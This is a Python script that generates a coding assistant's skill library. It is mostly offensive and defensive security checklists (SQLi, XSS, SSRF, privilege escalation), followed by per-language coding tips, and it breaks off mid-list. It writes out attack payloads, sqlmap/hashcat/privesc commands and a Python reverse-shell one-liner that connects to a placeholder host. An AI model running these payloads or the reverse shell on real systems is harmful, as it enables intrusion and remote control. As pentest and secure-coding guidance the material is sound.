#!/usr/bin/env python3
"""gen_skills.py — generate Priest Code's bundled skill library.

Each skill is a SKILL.md with frontmatter + a real, specific body: when to reach
for it, a concrete checklist, the pitfalls that actually bite, and (often) the
commands or a short example. Run this to (re)write priestcode/skills/**.

The content is curated per domain — heavy on offensive security — and expanded
systematically for the per-language basics so the catalogue is broad AND useful,
never filler. Run:  python scripts/gen_skills.py
"""
from __future__ import annotations

import os
import re
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "priestcode" / "skills"


def _slug(s: str) -> str:
    return re.sub(r"[^a-z0-9]+", "-", s.lower()).strip("-")


_written = []


def skill(category, name, description, tags, when, steps, pitfalls, example=""):
    """Emit one SKILL.md. steps/pitfalls are lists; example is optional text."""
    body = [f"# {name}", "", "## When to use", when.strip(), "", "## Checklist"]
    body += [f"- {s}" for s in steps]
    body += ["", "## Pitfalls"]
    body += [f"- {p}" for p in pitfalls]
    if example:
        body += ["", "## Example", example.strip()]
    front = ["---",
             f"name: {name}",
             f"description: {description}",
             f"category: {category}",
             f"tags: [{', '.join(tags)}]",
             "---", ""]
    text = "\n".join(front) + "\n".join(body) + "\n"
    # FLAT layout: category lives in the frontmatter, not the folder tree — so
    # setuptools never mistakes a category dir (algorithms/, architecture/, …)
    # for an importable subpackage. The filename encodes the category to stay
    # unique. The loader reads the category from the frontmatter.
    OUT.mkdir(parents=True, exist_ok=True)
    fname = _slug(category.replace("/", "-")) + "__" + _slug(name) + ".md"
    p = OUT / fname
    p.write_text(text, "utf-8")
    _written.append(fname)


# ══════════════════════════════════════════════════════════════════════
# SECURITY — the operator's field, so this goes deep.
# ══════════════════════════════════════════════════════════════════════

SEC = "security"


def gen_security():
    # ── OWASP-class web vulns ──
    skill(f"{SEC}/web", "SQL injection",
          "Find and exploit (or fix) SQL injection — string-built queries that let input change the query.",
          ["sqli", "injection", "web", "database", "owasp"],
          "Any place user input reaches a SQL query as text rather than a bound parameter.",
          ["Map every sink: string-concatenated or f-string SQL, ORM `.raw()`/`.extra()`, dynamic ORDER BY.",
           "Probe with a single quote, then `' OR '1'='1`, then boolean/time-based payloads (`' AND SLEEP(5)--`).",
           "Confirm with a differential: true vs false condition changes the response.",
           "Escalate: UNION SELECT to read columns, then schema (information_schema), then data.",
           "For blind: boolean or time-based extraction, one char at a time (or sqlmap).",
           "FIX: parameterized queries / prepared statements ONLY; never format SQL with input; least-priv DB user."],
          ["`ORDER BY` and identifiers can't be parameterized — allow-list them, don't concatenate.",
           "ORMs are not immune: `.raw()`, `.extra()`, and `.filter(RawSQL(...))` reintroduce it.",
           "Escaping quotes is not a fix; parameterization is."],
          "sqlmap -u 'https://t/item?id=1' --batch --dbs   # authorized targets only\n"
          "# fix (python): cur.execute('SELECT * FROM u WHERE id=%s', (uid,))")
    skill(f"{SEC}/web", "Cross-site scripting (XSS)",
          "Find and fix XSS — reflected, stored, and DOM — where input becomes executable markup.",
          ["xss", "injection", "web", "owasp", "csp"],
          "Any input that is rendered back into HTML/JS/attribute/URL context without correct encoding.",
          ["Classify the sink context: HTML body, attribute, JS string, URL, or CSS — each needs different encoding.",
           "Reflected: inject `<script>`, `\"><svg onload=...>`, event handlers; watch what survives.",
           "Stored: plant a payload, find where it renders for another user.",
           "DOM: trace `location`/`innerHTML`/`eval`/`document.write` sinks in JS.",
           "FIX: contextual output encoding, a strict CSP, `textContent` not `innerHTML`, framework auto-escaping left ON."],
          ["Blacklisting `<script>` is bypassable (`<img onerror>`, `<svg>`, event handlers, JS URIs).",
           "`innerHTML +=` and template literals into the DOM are classic DOM-XSS sinks.",
           "A CSP with `unsafe-inline` gives almost no protection."],
          "# CSP that actually helps:\nContent-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'")
    skill(f"{SEC}/web", "Command injection",
          "Find and fix OS command injection — input reaching a shell.",
          ["command-injection", "rce", "shell", "owasp"],
          "Any input passed to a shell: system(), popen(), backticks, exec with shell=True.",
          ["Find sinks: `os.system`, `subprocess(..., shell=True)`, `child_process.exec`, backticks, `Runtime.exec` with a string.",
           "Probe with shell metacharacters: `; id`, `| id`, `$(id)`, `` `id` ``, newline.",
           "Blind: time delay (`; sleep 5`) or an OOB DNS/HTTP callback.",
           "FIX: never build a shell string from input — pass an argv array with NO shell; allow-list where a value must be dynamic."],
          ["`shell=True` with any interpolated value is the whole bug; drop the shell.",
           "Quoting/escaping is fragile — argv arrays are the fix.",
           "`subprocess.getoutput`/`os.popen` are always shell-backed."],
          "# safe: subprocess.run(['ping','-c','1', host])  # host still validated\n# never: subprocess.run(f'ping -c1 {host}', shell=True)")
    skill(f"{SEC}/web", "Server-side request forgery (SSRF)",
          "Find and fix SSRF — making the server issue attacker-controlled requests.",
          ["ssrf", "web", "cloud", "owasp"],
          "Any feature that fetches a URL the user supplies (webhooks, image/URL preview, imports, PDF render).",
          ["Point the fetch at `http://169.254.169.254/` (cloud metadata), `http://localhost`, internal IPs.",
           "Try alternate encodings: decimal/octal IPs, `[::1]`, `0.0.0.0`, DNS rebinding, redirects to internal.",
           "Check what comes back (blind SSRF still leaks via timing/errors/OOB).",
           "FIX: allow-list destinations, resolve then validate the IP (block private/link-local), disable redirects, drop unused URL schemes."],
          ["Blocking `localhost` by string is bypassable — resolve the host and check the IP.",
           "Redirects re-introduce SSRF; validate the FINAL IP, not just the first.",
           "Fail CLOSED when the host can't be resolved/validated — never fall through to the request."],
          "# fix: resolve, reject private ranges (ipaddress.ip_address(ip).is_private), no redirects")
    skill(f"{SEC}/web", "Insecure direct object reference (IDOR)",
          "Find and fix IDOR/broken object-level authorization — accessing others' objects by id.",
          ["idor", "authz", "bola", "api", "owasp"],
          "Any endpoint that takes an object id (/orders/123) and returns/edits it.",
          ["Enumerate ids as user A, then request them as user B — do you get A's data?",
           "Try sequential, UUID, and encoded ids; check every verb (GET/PUT/DELETE), not just GET.",
           "Check indirect refs: filenames, export ids, nested resources.",
           "FIX: authorize on EVERY request — scope the query to the current user (WHERE owner_id = me), don't trust the id alone."],
          ["Authentication is not authorization — being logged in ≠ allowed to see object 123.",
           "Hiding the id (UUID) is not a fix; enforce ownership server-side.",
           "Mass-assignment often rides along — bind only allowed fields."],
          "")
    skill(f"{SEC}/web", "Broken authentication",
          "Assess and harden authentication — login, sessions, password handling.",
          ["auth", "session", "password", "owasp"],
          "Any login, session, password reset, or 'remember me' flow.",
          ["Check password storage: bcrypt/argon2/scrypt with a salt — never MD5/SHA/plain.",
           "Session: httpOnly+Secure+SameSite cookies, rotation on login, server-side invalidation on logout.",
           "Rate-limit and lock out credential stuffing; add MFA for sensitive accounts.",
           "Password reset: single-use, expiring, unguessable tokens; no user enumeration in responses.",
           "FIX: use a vetted auth library; don't roll your own."],
          ["Fast hashes (SHA-256) are wrong for passwords — use a slow KDF.",
           "JWT in localStorage is XSS-exfiltratable; prefer httpOnly cookies.",
           "'User not found' vs 'wrong password' leaks valid usernames."],
          "")
    skill(f"{SEC}/web", "Server-side template injection (SSTI)",
          "Find and exploit/fix SSTI — user input evaluated by a template engine, leading to RCE.",
          ["ssti", "rce", "template", "owasp"],
          "User input concatenated into a template string (Jinja2, Twig, Freemarker, ERB, Velocity).",
          ["Probe with `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` — a `49` means evaluation.",
           "Fingerprint the engine, then reach the sandbox escape / object graph to RCE.",
           "FIX: never build templates from input — pass input as DATA to a fixed template; sandbox if truly needed."],
          ["Rendering user-controlled template SOURCE is the bug; user DATA in a fixed template is fine.",
           "Jinja2 autoescape protects against XSS, not SSTI."],
          "# vuln: Template('Hi ' + name).render()\n# safe: Template('Hi {{name}}').render(name=name)")
    skill(f"{SEC}/web", "XML external entity (XXE)",
          "Find and fix XXE — XML parsers resolving external entities.",
          ["xxe", "xml", "ssrf", "owasp"],
          "Any endpoint parsing user-supplied XML (SOAP, SVG, DOCX/XLSX, config uploads).",
          ["Inject a DOCTYPE with an external entity reading `file:///etc/passwd` or an OOB URL.",
           "Try parameter entities for blind/OOB exfiltration.",
           "FIX: disable DTDs and external entities in the parser (defusedxml in Python)."],
          ["Almost every default XML parser is vulnerable unless explicitly hardened.",
           "SVG and Office files are XML — file uploads are an XXE surface."],
          "# python: use defusedxml, or set resolve_entities=False / disable DTD")
    skill(f"{SEC}/web", "CSRF",
          "Find and fix cross-site request forgery — state-changing requests without an anti-forgery token.",
          ["csrf", "web", "cookies", "owasp"],
          "Any cookie-authenticated, state-changing endpoint (POST/PUT/DELETE).",
          ["Check for an anti-CSRF token that is validated server-side and bound to the session.",
           "Check SameSite on the session cookie (Lax/Strict blocks most cross-site sends).",
           "FIX: per-session CSRF tokens on all mutating requests + SameSite cookies; don't rely on referer alone."],
          ["GET requests that change state are CSRF-able and cache-poisonable.",
           "CORS is not CSRF protection.",
           "SameSite=None without a token re-opens it."],
          "")
    skill(f"{SEC}/web", "Insecure deserialization",
          "Find and fix unsafe deserialization leading to RCE or object injection.",
          ["deserialization", "rce", "pickle", "owasp"],
          "Any place untrusted bytes are deserialized: pickle, PHP unserialize, Java readObject, YAML load.",
          ["Find the sink: `pickle.loads`, `yaml.load` (unsafe), Java `ObjectInputStream`, PHP `unserialize`.",
           "Build a gadget-chain payload for the language/framework to prove impact.",
           "FIX: never deserialize untrusted data with these; use JSON / safe loaders; sign+verify if you must."],
          ["`yaml.load` without SafeLoader executes arbitrary objects — use `yaml.safe_load`.",
           "Pickle is not a data format for untrusted input, ever."],
          "# safe: yaml.safe_load(x); json.loads(x)  # never pickle.loads(untrusted)")
    skill(f"{SEC}/web", "Security misconfiguration",
          "Find misconfigurations — debug endpoints, default creds, verbose errors, open buckets.",
          ["misconfig", "hardening", "owasp"],
          "Deployment review, or when a target exposes more than it should.",
          ["Look for debug mode on in prod, stack traces, exposed /admin, actuator, .git, .env, backups.",
           "Check default/weak credentials on every service.",
           "Check security headers (HSTS, CSP, X-Content-Type-Options), directory listing, open cloud storage.",
           "FIX: harden defaults, disable debug, strip banners, close/authenticate management endpoints."],
          ["`.git/` and `.env` served statically leak the whole app.",
           "Verbose errors are a recon goldmine."],
          "")
    # ── deeper injection / api ──
    skill(f"{SEC}/web", "NoSQL injection",
          "Find and fix NoSQL injection (MongoDB operator injection, etc.).",
          ["nosql", "injection", "mongodb"],
          "Input reaching a NoSQL query, especially JSON bodies mapped straight into a query.",
          ["Try operator injection: `{\"$gt\":\"\"}`, `{\"$ne\":null}`, `{\"$regex\":\"^a\"}` in place of a value.",
           "Auth bypass: `{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}`.",
           "FIX: cast/validate types, reject objects where a scalar is expected, use an ODM with strict schemas."],
          ["Passing a parsed JSON body straight into `find()` lets `$` operators through.",
           "Type juggling is the root — enforce that a password is a string."],
          "")
    skill(f"{SEC}/web", "JWT attacks",
          "Assess and fix JSON Web Token handling — alg confusion, weak secrets, missing checks.",
          ["jwt", "auth", "crypto"],
          "Any system using JWTs for auth/session.",
          ["Check `alg`: reject `none`; don't let RS256↔HS256 confusion use the public key as an HMAC secret.",
           "Crack weak HMAC secrets offline (hashcat mode 16500).",
           "Verify exp/nbf/aud/iss are actually checked; check for missing signature verification.",
           "FIX: pin the algorithm, strong secret or proper key, verify all claims, short expiry + rotation."],
          ["`alg:none` and alg-confusion come from libraries that trust the header's alg.",
           "JWTs can't be revoked without extra state — plan for logout/rotation."],
          "hashcat -m 16500 jwt.txt wordlist.txt   # authorized testing")
    skill(f"{SEC}/web", "API security testing",
          "Test a REST/GraphQL API for the API-specific top risks.",
          ["api", "rest", "graphql", "authz"],
          "Any API assessment.",
          ["BOLA/IDOR on every object id; function-level authz on every verb and admin route.",
           "Mass assignment: send extra fields (role, is_admin) and see if they bind.",
           "Rate limiting, resource exhaustion, and excessive data exposure in responses.",
           "GraphQL: introspection, query depth/complexity, batching abuse, field-level authz.",
           "FIX: authorize server-side per object+action; return only needed fields; cap depth/rate."],
          ["Client-side field hiding ≠ authorization.",
           "GraphQL introspection + deep queries enable enumeration and DoS."],
          "")
    # ── recon / scanning / tooling ──
    skill(f"{SEC}/recon", "Network recon with nmap",
          "Discover hosts, ports, and services with nmap effectively.",
          ["nmap", "recon", "scanning", "ports"],
          "Start of an authorized engagement — map the attack surface.",
          ["Host discovery first (`-sn`) on the scope, then port scan live hosts.",
           "Service/version + default scripts on found ports (`-sV -sC`).",
           "Tune timing (`-T4`) and scope; full TCP (`-p-`) when time allows, top-ports when not.",
           "Save all formats (`-oA`) for later parsing."],
          ["`-T5` drops results on flaky links; `-T4` is the safer default.",
           "UDP scanning is slow and noisy — target known UDP services.",
           "Scanning out of scope is illegal — confirm the ROE."],
          "nmap -sV -sC -T4 -p- -oA scan target   # authorized scope only")
    skill(f"{SEC}/recon", "Web content discovery",
          "Find hidden endpoints, files, and parameters on a web target.",
          ["fuzzing", "web", "recon", "ffuf", "gobuster"],
          "Enumerating a web app's hidden surface.",
          ["Directory/file brute force with a good wordlist (SecLists), filter by size/status.",
           "Vhost and subdomain enumeration; check robots.txt, sitemap, JS files for endpoints.",
           "Parameter discovery (arjun/ffuf) on interesting endpoints.",
           "Grep JS bundles for API paths, keys, and comments."],
          ["Filter out the false-positive size (soft 404s) or you drown in noise.",
           "Rate-limit to avoid taking the target down / getting blocked."],
          "ffuf -u https://t/FUZZ -w wordlist.txt -mc 200,301,302,403 -fs 0")
    skill(f"{SEC}/recon", "OSINT gathering",
          "Collect open-source intelligence on a target org (authorized).",
          ["osint", "recon", "footprinting"],
          "Pre-engagement footprinting within an authorized scope.",
          ["Domains/subdomains (crt.sh, amass), IP ranges, ASN.",
           "Employees, emails, tech stack (LinkedIn, job posts, BuiltWith).",
           "Leaked creds (HIBP), exposed docs, code (GitHub dorking for secrets).",
           "Cloud assets, S3 buckets, exposed dashboards."],
          ["Stay within scope and legality — passive doesn't mean unlimited.",
           "GitHub secret leaks are common — search org repos and forks."],
          "")
    skill(f"{SEC}/exploit", "Reverse shells",
          "Get and stabilize a reverse shell during authorized testing.",
          ["reverse-shell", "post-exploitation", "netcat"],
          "After achieving code execution on an authorized target.",
          ["Pick a payload matching the target (bash, python, nc, powershell); set up the listener first.",
           "Stabilize a dumb shell: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'`, then `stty raw -echo`.",
           "Consider egress: try common outbound ports (443/53) if firewalled.",
           "Upgrade to a C2/meterpreter only if the ROE allows."],
          ["An unstable shell dies on Ctrl-C and has no tab-complete — always stabilize.",
           "Hardcoding your IP wrong = no callback; double-check LHOST/LPORT."],
          "# listener: nc -lvnp 443\n# python rev: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"IP\",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'")
    skill(f"{SEC}/exploit", "Linux privilege escalation",
          "Enumerate and escalate privileges on a Linux host (authorized).",
          ["privesc", "linux", "post-exploitation"],
          "You have a low-priv shell and need root, with authorization.",
          ["Run enumeration (linpeas) but also check manually: sudo -l, SUID binaries, cron, capabilities.",
           "Check writable files in PATH, world-writable service files, kernel version for known exploits.",
           "GTFOBins for any sudo/SUID binary you can abuse.",
           "Look for creds in configs, history, env, backups."],
          ["Kernel exploits can crash the box — prefer misconfig paths first.",
           "`sudo -l` is the fastest win people skip."],
          "sudo -l; find / -perm -4000 -type f 2>/dev/null   # SUID hunt")
    skill(f"{SEC}/exploit", "Windows privilege escalation",
          "Enumerate and escalate on Windows (authorized).",
          ["privesc", "windows", "post-exploitation"],
          "Low-priv Windows shell, authorized.",
          ["Enumerate (winPEAS): unquoted service paths, weak service perms, AlwaysInstallElevated, token privs.",
           "Check SeImpersonate → potato attacks; stored creds (cmdkey, registry, SAM).",
           "Scheduled tasks and writable service binaries.",
           "Check for known privesc CVEs by patch level."],
          ["AV/EDR will flag common tools — know your ROE.",
           "Unquoted service paths need a writable parent dir to exploit."],
          "")
    skill(f"{SEC}/exploit", "Buffer overflow (stack)",
          "Exploit a classic stack buffer overflow (authorized/CTF).",
          ["binary", "buffer-overflow", "exploitation", "pwn"],
          "A native binary that copies input into a fixed stack buffer without bounds.",
          ["Find the offset to EIP/RIP (cyclic pattern).",
           "Check protections (checksec): NX, ASLR, canary, PIE — they change the technique.",
           "No NX: inject shellcode + jump to it; NX: ret2libc / ROP.",
           "Handle bad chars; build the chain; test locally then against the target."],
          ["Canary present → you need a leak first.",
           "ASLR/PIE → you need an address leak; static addresses won't work."],
          "checksec ./bin   # know the protections before choosing a technique")
    skill(f"{SEC}/exploit", "Password cracking",
          "Crack captured hashes efficiently with hashcat/john (authorized).",
          ["cracking", "hashcat", "john", "hashes"],
          "You have password hashes from an authorized engagement.",
          ["Identify the hash type (hashid / hashcat --identify).",
           "Start with a good wordlist + rules (rockyou + best64), then mask attacks for patterns.",
           "Use GPU (hashcat) for speed; target the right mode.",
           "Prioritize: reused passwords, admin accounts, then the long tail."],
          ["Wrong hash mode = zero cracks; identify first.",
           "Salted slow hashes (bcrypt) resist brute force — lean on wordlists+rules."],
          "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule")
    skill(f"{SEC}/exploit", "Fuzzing for bugs",
          "Fuzz a target (file/protocol/API) to find crashes and vulns.",
          ["fuzzing", "afl", "libfuzzer"],
          "Hunting memory-safety or logic bugs in a parser/native code.",
          ["Pick a fuzzer: coverage-guided (AFL++, libFuzzer) for native; property/schema fuzzers for APIs.",
           "Build with sanitizers (ASan/UBSan); provide a good seed corpus; add a harness.",
           "Triage crashes: minimize, dedupe by stack, assess exploitability.",
           "Fix root cause, add the crashing input as a regression test."],
          ["No sanitizer = you miss most memory bugs.",
           "A bad corpus/harness wastes CPU — cover real input shapes."],
          "")
    skill(f"{SEC}/appsec", "Secrets in code",
          "Find and remediate hardcoded secrets (keys, tokens, passwords).",
          ["secrets", "gitleaks", "appsec"],
          "Code review, pre-commit, or auditing a repo/history for leaked credentials.",
          ["Scan working tree AND full git history (gitleaks, trufflehog) — history keeps deleted secrets.",
           "Verify hits (many are false positives / test fixtures).",
           "For real leaks: ROTATE the secret first, then purge from history (BFG/filter-repo).",
           "FIX: move secrets to env/secret manager; add a pre-commit scanner; add patterns to .gitignore."],
          ["Deleting a secret in a new commit does NOT remove it from history — rotate it.",
           "A public repo leak means assume compromised — rotate immediately."],
          "gitleaks detect --source . -v")
    skill(f"{SEC}/appsec", "Dependency & supply-chain audit",
          "Audit third-party dependencies for known CVEs and supply-chain risk.",
          ["dependencies", "sca", "cve", "supply-chain"],
          "Before release, or auditing an unfamiliar project.",
          ["Run the ecosystem scanner: pip-audit, npm audit, osv-scanner, cargo audit.",
           "Triage by reachability and severity — not every CVE is exploitable in your usage.",
           "Pin and lock versions; verify integrity (hashes/lockfiles).",
           "Watch for typosquats, recently-changed maintainers, install scripts."],
          ["`npm audit` severity ≠ your exploitability; check reachability.",
           "Transitive deps carry most of the risk."],
          "osv-scanner -r .   ;   pip-audit   ;   npm audit --production")
    skill(f"{SEC}/appsec", "Threat modeling",
          "Threat-model a feature or system before building it.",
          ["threat-model", "design", "stride"],
          "Design phase of anything security-relevant.",
          ["Diagram data flow and trust boundaries.",
           "Enumerate threats per element (STRIDE: spoofing, tampering, repudiation, info-disclosure, DoS, elevation).",
           "Rate by likelihood×impact; decide mitigate/accept/transfer.",
           "Turn top threats into concrete requirements and tests."],
          ["A threat model with no follow-through changes nothing — track the mitigations.",
           "Don't model in a vacuum — include the deployment and the humans."],
          "")
    skill(f"{SEC}/crypto", "Applied crypto do's and don'ts",
          "Use cryptography correctly — pick the right primitive, use it right.",
          ["crypto", "encryption", "hashing"],
          "Any time you reach for encryption, hashing, signing, or randomness.",
          ["Encryption: authenticated (AES-GCM / libsodium secretbox); never ECB; unique nonce per message.",
           "Passwords: argon2/bcrypt/scrypt — a slow KDF with a salt, never a fast hash.",
           "Integrity/signatures: HMAC or Ed25519; constant-time compare.",
           "Randomness: a CSPRNG (secrets/os.urandom), never `random`.",
           "Keys: from a KDF or generated; stored in a secret manager."],
          ["Never invent a scheme or 'encrypt' with XOR/base64.",
           "Nonce reuse in GCM/CTR is catastrophic.",
           "`==` on secrets leaks via timing — use a constant-time compare."],
          "# python: from cryptography.hazmat ... AESGCM; or PyNaCl SecretBox")
    skill(f"{SEC}/mobile", "Android app security testing",
          "Assess an Android APK for common mobile vulnerabilities.",
          ["android", "mobile", "apk", "reversing"],
          "Testing an Android app you're authorized to assess.",
          ["Decompile (jadx/apktool); read the manifest for exported components, permissions, debuggable.",
           "Check for secrets/keys in code and resources; insecure storage (SharedPrefs, SQLite).",
           "Inspect network: cleartext, cert pinning, and try to bypass pinning (Frida/objection).",
           "Test exported activities/services/providers for IPC abuse."],
          ["`android:exported=true` components are an entry point.",
           "Client-side secrets are recoverable — treat the app as untrusted."],
          "jadx-gui app.apk   ;   apktool d app.apk")
    skill(f"{SEC}/blue", "Log analysis & detection",
          "Hunt for intrusion in logs and build detections.",
          ["blue-team", "logs", "detection", "dfir"],
          "Incident response or building detections.",
          ["Baseline normal, then hunt anomalies: auth failures/spikes, new admin, odd process trees, beaconing.",
           "Correlate across sources (auth, web, EDR, DNS) on time and identity.",
           "Turn a confirmed pattern into a durable detection rule.",
           "Preserve evidence; document timeline."],
          ["Clock skew across sources breaks correlation — normalize to UTC.",
           "Attackers clear logs — ship logs off-host."],
          "")
    skill(f"{SEC}/web", "Access control review",
          "Systematically verify authorization across an app.",
          ["authz", "access-control", "owasp"],
          "Reviewing whether users can only do/see what they're allowed to.",
          ["Map roles × resources × actions into a matrix; test each cell as each role.",
           "Vertical (user→admin) and horizontal (user A→user B) escalation.",
           "Force-browse admin URLs and hidden functions as a low-priv user.",
           "FIX: deny-by-default, centralized checks, enforce on the server for every action."],
          ["UI hiding a button is not access control.",
           "Checks scattered per-endpoint get missed — centralize."],
          "")


# ══════════════════════════════════════════════════════════════════════
# LANGUAGES — systematic, real per-(language, aspect) skills.
# ══════════════════════════════════════════════════════════════════════

LANG_ASPECTS = {
    "idioms": ("{L} idioms & style",
               "Write idiomatic, readable {L} the way its community expects.",
               ["idioms", "style"],
               "Writing or reviewing {L} that should look native to the language.",
               "{IDIOMS}", "{IDIOM_PIT}"),
    "errors": ("{L} error handling",
               "Handle errors correctly in {L} — the right mechanism, no swallowed failures.",
               ["errors", "exceptions"],
               "Any {L} code that can fail (I/O, parsing, network, external calls).",
               "{ERR}", "{ERR_PIT}"),
    "testing": ("{L} testing",
                "Write and run effective {L} tests with the standard tooling.",
                ["testing"],
                "Adding or fixing tests in a {L} project.",
                "{TEST}", "{TEST_PIT}"),
    "concurrency": ("{L} concurrency",
                    "Write correct concurrent/async {L} without races or deadlocks.",
                    ["concurrency", "async"],
                    "Any {L} code doing parallel/async work or shared state.",
                    "{CONC}", "{CONC_PIT}"),
    "perf": ("{L} performance",
             "Profile and speed up {L} code with evidence.",
             ["performance"],
             "A {L} hot path that's too slow — measured, not guessed.",
             "{PERF}", "{PERF_PIT}"),
    "packaging": ("{L} packaging & deps",
                  "Structure, build, and ship a {L} project and its dependencies.",
                  ["packaging", "build", "dependencies"],
                  "Setting up, building, or releasing a {L} project.",
                  "{PKG}", "{PKG_PIT}"),
}

# Per-language curated content (kept concise but real). Each maps aspect-keys to
# (steps_list, pitfalls_list).
LANG_DATA = {
    "Python": {
        "idioms": (["Prefer comprehensions, generators, and unpacking over manual loops where clearer.",
                    "Use dataclasses/NamedTuple for records; context managers for resources.",
                    "EAFP over LBYL; iterate directly, use enumerate/zip.",
                    "Type-hint public functions; run mypy/pyright."],
                   ["Mutable default args (`def f(x=[])`) share state across calls.",
                    "`is` vs `==`; `is` only for None/singletons."]),
        "errors": (["Catch the narrowest exception; never bare `except:`.",
                    "Use `raise ... from e` to preserve the cause.",
                    "Clean up with `with`/`finally`; don't swallow and continue silently.",
                    "Validate at boundaries; fail loud early."],
                   ["Bare `except` hides bugs (incl. KeyboardInterrupt).",
                    "Returning None on error forces callers to guess — raise or return a Result."]),
        "testing": (["pytest with plain asserts; fixtures for setup; parametrize edge cases.",
                     "Test the happy path, edges, and error paths; add a regression test per bug.",
                     "Mock at boundaries (monkeypatch), not internals.",
                     "Run: `python -m pytest -q`."],
                    ["Over-mocking tests the mock, not the code.",
                     "Shared mutable fixtures leak state between tests."]),
        "concurrency": (["I/O-bound: asyncio or threads. CPU-bound: multiprocessing (the GIL blocks threads).",
                         "asyncio: never call blocking code in a coroutine; use `to_thread`.",
                         "Guard shared state with locks; prefer queues over shared mutables.",
                         "Always await/cancel tasks; handle CancelledError."],
                        ["Blocking the event loop freezes everything.",
                         "Threads won't speed up CPU work under the GIL."]),
        "perf": (["Profile first: cProfile / py-spy; find the real hot line.",
                  "Fix algorithmics; use built-ins (they're C), sets for membership, local vars in loops.",
                  "Batch I/O; avoid repeated attribute lookups in tight loops.",
                  "Measure before/after."],
                 ["Micro-optimizing cold code wastes time.",
                  "Premature C-extension before profiling."]),
        "packaging": (["Use pyproject.toml; a virtualenv or uv/poetry; pin with a lockfile.",
                       "Keep an importable package layout; expose a console entry point.",
                       "Separate runtime vs dev deps."],
                      ["Committing a venv; unpinned deps that drift.",
                       "`pip install` outside a venv pollutes the system."]),
    },
    "JavaScript": {
        "idioms": (["const by default, let when reassigned, never var; use ===.",
                    "Destructuring, spread, optional chaining, nullish coalescing.",
                    "Array methods (map/filter/reduce) over index loops when clearer.",
                    "Modules (import/export), not globals."],
                   ["`==` type coercion surprises; use `===`.",
                    "`this` binding in callbacks — use arrow functions."]),
        "errors": (["try/catch around async awaits; reject with Error objects, not strings.",
                    "Handle promise rejections; add a global unhandledRejection handler.",
                    "Validate inputs at the edge."],
                   ["Unhandled promise rejections crash or silently drop.",
                    "Throwing non-Error loses the stack."]),
        "testing": (["Jest/Vitest; describe/it; test async with await; mock modules at the boundary.",
                     "Cover edges and error paths; snapshot only stable output.",
                     "Run: `npm test`."],
                    ["Flaky tests from real timers/network — fake them.",
                     "Snapshot everything → brittle tests."]),
        "concurrency": (["Single-threaded event loop; use async/await; Promise.all for parallel I/O.",
                         "Don't block the loop with sync CPU work — use workers.",
                         "Handle partial failures in Promise.allSettled."],
                        ["`await` in a loop serializes — batch with Promise.all.",
                         "Blocking the loop freezes the app."]),
        "perf": (["Profile in DevTools; avoid layout thrash; debounce/throttle events.",
                  "Minimize main-thread work; lazy-load; memoize pure work.",
                  "Measure with real traces."],
                 ["Premature memoization adds bugs.",
                  "Big synchronous JSON parses block the loop."]),
        "packaging": (["package.json scripts; a lockfile; ESM modules; a bundler if shipping to browsers.",
                       "Separate dependencies vs devDependencies; pin versions."],
                      ["Committing node_modules; unpinned ranges that break builds.",
                       "Mixing ESM/CJS carelessly."]),
    },
}

# Languages that get the systematic treatment with lighter (shared) content.
GENERIC_LANGS = ["TypeScript", "Go", "Rust", "Java", "C", "C++", "C#", "Ruby",
                 "PHP", "Swift", "Kotlin", "Bash"]

# Distinct folder slugs — _slug collapses C/C++/C# to "c", which would overwrite.
LANG_SLUG = {"C++": "cpp", "C#": "csharp"}


def _lang_slug(lang):
    return LANG_SLUG.get(lang, _slug(lang))


# Per-language footguns — the sharp edges that actually cause bugs. Curated.
LANG_GOTCHAS = {
    "Python": ["Mutable default arguments persist across calls.",
               "Late-binding closures in loops capture the variable, not its value.",
               "`is` vs `==`; integer/​string identity caching is not guaranteed.",
               "Bare `except` swallows KeyboardInterrupt/SystemExit."],
    "JavaScript": ["`==` coercion; always use `===`.",
                   "`this` rebinds in callbacks — use arrows or bind.",
                   "Floating-point money math; `0.1+0.2 !== 0.3`.",
                   "`typeof null === 'object'`; array holes; `[]+[]`."],
    "TypeScript": ["`any` and `as` casts silently disable the type checker.",
                   "Types are erased at runtime — validate external data.",
                   "Structural typing lets unexpected shapes through.",
                   "Non-null `!` assertions hide real nulls."],
    "Go": ["`nil` interface != nil concrete; the typed-nil gotcha.",
           "Loop variable captured by goroutines (pre-1.22) shares one var.",
           "Ignoring returned errors; unchecked type assertions panic.",
           "Slices share backing arrays — append can mutate aliases."],
    "Rust": ["Fighting the borrow checker instead of restructuring ownership.",
             "`.unwrap()`/`.expect()` panic in production paths.",
             "Integer overflow panics in debug, wraps in release.",
             "Holding a lock across an `.await` can deadlock."],
    "Java": ["`==` compares references for objects; use `.equals`.",
             "NullPointerException from unchecked nulls; autoboxing NPEs.",
             "Mutable static state and thread-safety bugs.",
             "Catching Exception too broadly hides failures."],
    "C": ["Buffer overflows, off-by-one, and unbounded strcpy/sprintf.",
          "Use-after-free, double-free, and leaks — own every malloc.",
          "Undefined behavior (signed overflow, uninit reads) the compiler exploits.",
          "Never use gets(); check every return/length."],
    "C++": ["Manual memory — prefer RAII/smart pointers over new/delete.",
            "Dangling references/iterators after container reallocation.",
            "Object slicing; the rule of three/five/zero.",
            "UB from data races, signed overflow, invalid casts."],
    "C#": ["`==` on reference types vs `.Equals`; nullable reference warnings.",
           "async void (except handlers) swallows exceptions.",
           "Disposing IDisposable — use `using`.",
           "Blocking on async (`.Result`/`.Wait`) can deadlock."],
    "Ruby": ["Monkey-patching core classes causes spooky action at a distance.",
             "`nil` errors; truthiness (only nil/false are falsy).",
             "Mutating shared objects passed by reference.",
             "Method-missing magic hiding real errors."],
    "PHP": ["Loose comparison `==` type juggling (`'0e1'==’0e2'`); use `===`.",
            "Unsanitized input in SQL/shell/echo (SQLi/XSS/RCE).",
            "`null`/undefined array keys; silent type coercion.",
            "Global state and superglobals."],
    "Swift": ["Force-unwrapping optionals (`!`) crashes on nil.",
              "Retain cycles in closures — use `[weak self]`.",
              "Value vs reference semantics (struct vs class) surprises.",
              "Implicitly unwrapped optionals hiding nils."],
    "Kotlin": ["Platform types from Java can be null despite non-null types.",
               "`!!` force-unwrap crashes on null.",
